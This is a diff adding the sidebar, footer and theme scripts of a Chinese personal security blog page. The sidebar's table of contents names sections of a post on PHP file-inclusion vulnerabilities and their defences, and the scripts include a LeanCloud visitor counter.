+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="l1nk3r" />
+            
+              <p class="site-author-name" itemprop="name">l1nk3r</p>
+              <p class="site-description motion-element" itemprop="description">愿你出走半生，归来仍是少年</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sukaralin" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:sukaralin@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/SukaraLin" target="_blank" title="Weibo">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01前提概要"><span class="nav-text">0x01前提概要</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02函数介绍"><span class="nav-text">0x02函数介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02漏洞场景"><span class="nav-text">0x02漏洞场景</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-LFI-Local-File-Inclusion"><span class="nav-text">1. LFI(Local File Inclusion)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-RFI-Remote-File-Inclusion"><span class="nav-text">2. RFI(Remote File Inclusion)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-包含姿势总结"><span class="nav-text">3. 包含姿势总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-php伪协议"><span class="nav-text">3.1 php伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php-input"><span class="nav-text">php://input</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-filter"><span class="nav-text">php://filter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phar"><span class="nav-text">phar://</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#zip"><span class="nav-text">zip://</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#data-URI-schema"><span class="nav-text">data:URI schema</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-包含sessions"><span class="nav-text">3.2 包含sessions</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-包含日志"><span class="nav-text">3.3 包含日志</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#访问日志"><span class="nav-text">访问日志</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSH-log"><span class="nav-text">SSH log</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4包含上传文件"><span class="nav-text">3.4包含上传文件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03绕过姿势"><span class="nav-text">0x03绕过姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-指定前缀"><span class="nav-text">1. 指定前缀</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#目录遍历"><span class="nav-text">目录遍历</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-编码绕过"><span class="nav-text">2. 编码绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-指定后缀"><span class="nav-text">3. 指定后缀</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#远程文件包含的利用"><span class="nav-text">远程文件包含的利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-长度截断"><span class="nav-text">4. 长度截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-00字节截断"><span class="nav-text">5. %00字节截断</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-防御方案"><span class="nav-text">0x04 防御方案</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Refer"><span class="nav-text">Refer</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">l1nk3r</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+    
+      <!-- custom analytics part create by xiamo -->
+<script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+<script>AV.initialize("UK6XjHUbz1agzT32wU9TCYHNH-gzGzoHsz", "Qok6iqgiGgI7g4lDx8MdQVEu");</script>
+<script>
+function showTime(Counter) {
+	var query = new AV.Query(Counter);
+	$(".leancloud_visitors").each(function() {
+		var url = $(this).attr("id").trim();
+		query.equalTo("url", url);
+		query.find({
+			success: function(results) {
+				if (results.length == 0) {
+					var content = '0 ' + $(document.getElementById(url)).text();
+					$(document.getElementById(url)).text(content);
+					return;
+				}
+				for (var i = 0; i < results.length; i++) {
+					var object = results[i];
+					var content = object.get('time') + ' ' + $(document.getElementById(url)).text();
+					$(document.getElementById(url)).text(content);
+				}
+			},
+			error: function(object, error) {
+				console.log("Error: " + error.code + " " + error.message);
+			}
+		});
+
+	});
+}
+
+function addCount(Counter) {
+	var Counter = AV.Object.extend("Counter");
+	url = $(".leancloud_visitors").attr('id').trim();
+	title = $(".leancloud_visitors").attr('data-flag-title').trim();
+	var query = new AV.Query(Counter);
+	query.equalTo("url", url);
+	query.find({
+		success: function(results) {
+			if (results.length > 0) {
+				var counter = results[0];
+				counter.fetchWhenSave(true);
+				counter.increment("time");
+				counter.save(null, {
+					success: function(counter) {
+						var content =  counter.get('time') + ' ' + $(document.getElementById(url)).text();
+						$(document.getElementById(url)).text(content);
+					},
+					error: function(counter, error) {
+						console.log('Failed to save Visitor num, with error message: ' + error.message);
+					}
+				});
+			} else {
+				var newcounter = new Counter();
+				newcounter.set("title", title);
+				newcounter.set("url", url);
+				newcounter.set("time", 1);
+				newcounter.save(null, {
+					success: function(newcounter) {
+					    console.log("newcounter.get('time')="+newcounter.get('time'));
+						var content = newcounter.get('time') + ' ' + $(document.getElementById(url)).text();
+						$(document.getElementById(url)).text(content);
+					},
+					error: function(newcounter, error) {
+						console.log('Failed to create');
+					}
+				});
+			}
+		},
+		error: function(error) {
+			console.log('Error:' + error.code + " " + error.message);
+		}
+	});
+}
+$(function() {
+	var Counter = AV.Object.extend("Counter");
+	if ($('.leancloud_visitors').length == 1) {
+		addCount(Counter);
+	} else if ($('.post-title-link').length > 1) {
+		showTime(Counter);
+	}
+}); 
+</script>
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("UK6XjHUbz1agzT32wU9TCYHNH-gzGzoHsz", "Qok6iqgiGgI7g4lDx8MdQVEu");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <!-- 页面点击小红心 --> <script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
